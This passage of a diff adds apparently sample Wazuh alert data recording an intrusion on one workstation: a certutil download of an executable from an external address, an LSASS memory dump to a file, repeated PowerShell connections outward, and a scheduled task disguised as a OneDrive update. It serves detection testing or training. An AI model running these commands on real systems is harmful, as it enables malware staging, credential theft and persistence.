+          "commandLine": "certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\proc.exe",
+          "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "user": "CORP\\j.doe"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:18:16.000+0000",
+    "rule": {
+      "id": "100212",
+      "level": 13,
+      "description": "Sysmon - Suspicious process accessed LSASS memory",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event_10",
+        "local"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1003.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726721.708617",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "10",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Sysmon"
+        },
+        "eventdata": {
+          "sourceImage": "C:\\Users\\Public\\proc.exe",
+          "image": "C:\\Users\\Public\\proc.exe",
+          "targetImage": "C:\\Windows\\system32\\lsass.exe",
+          "grantedAccess": "0x1010",
+          "commandLine": "C:\\Users\\Public\\proc.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:19:16.000+0000",
+    "rule": {
+      "id": "100213",
+      "level": 8,
+      "description": "Sysmon - PowerShell network connection to external host",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event3",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726722.246180",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "3",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Sysmon"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "sourceIp": "10.30.7.57",
+          "destinationIp": "198.51.100.23",
+          "destinationPort": "443",
+          "protocol": "tcp",
+          "user": "CORP\\j.doe"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:20:16.000+0000",
+    "rule": {
+      "id": "100213",
+      "level": 8,
+      "description": "Sysmon - PowerShell network connection to external host",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event3",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726723.495379",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "3",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Sysmon"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "sourceIp": "10.30.7.57",
+          "destinationIp": "198.51.100.23",
+          "destinationPort": "443",
+          "protocol": "tcp",
+          "user": "CORP\\j.doe"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:21:16.000+0000",
+    "rule": {
+      "id": "100213",
+      "level": 8,
+      "description": "Sysmon - PowerShell network connection to external host",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event3",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726724.27240",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "3",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Sysmon"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "sourceIp": "10.30.7.57",
+          "destinationIp": "198.51.100.23",
+          "destinationPort": "443",
+          "protocol": "tcp",
+          "user": "CORP\\j.doe"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:22:16.000+0000",
+    "rule": {
+      "id": "100213",
+      "level": 8,
+      "description": "Sysmon - PowerShell network connection to external host",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event3",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726725.650641",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "3",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Sysmon"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "sourceIp": "10.30.7.57",
+          "destinationIp": "198.51.100.23",
+          "destinationPort": "443",
+          "protocol": "tcp",
+          "user": "CORP\\j.doe"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:23:16.000+0000",
+    "rule": {
+      "id": "100213",
+      "level": 8,
+      "description": "Sysmon - PowerShell network connection to external host",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event3",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726726.928187",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "3",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Sysmon"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "sourceIp": "10.30.7.57",
+          "destinationIp": "198.51.100.23",
+          "destinationPort": "443",
+          "protocol": "tcp",
+          "user": "CORP\\j.doe"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:24:16.000+0000",
+    "rule": {
+      "id": "100213",
+      "level": 8,
+      "description": "Sysmon - PowerShell network connection to external host",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event3",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726727.989984",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "3",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Sysmon"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "sourceIp": "10.30.7.57",
+          "destinationIp": "198.51.100.23",
+          "destinationPort": "443",
+          "protocol": "tcp",
+          "user": "CORP\\j.doe"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:25:16.000+0000",
+    "rule": {
+      "id": "100214",
+      "level": 10,
+      "description": "Sysmon - Scheduled task created from command line",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1053.005"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726728.589678",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Sysmon"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\schtasks.exe",
+          "commandLine": "schtasks /create /sc onlogon /tn \"OneDrive Update\" /tr \"C:\\Users\\Public\\proc.exe\"",
+          "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "user": "CORP\\j.doe"
+        }
+      }
+    }
+  }
+]
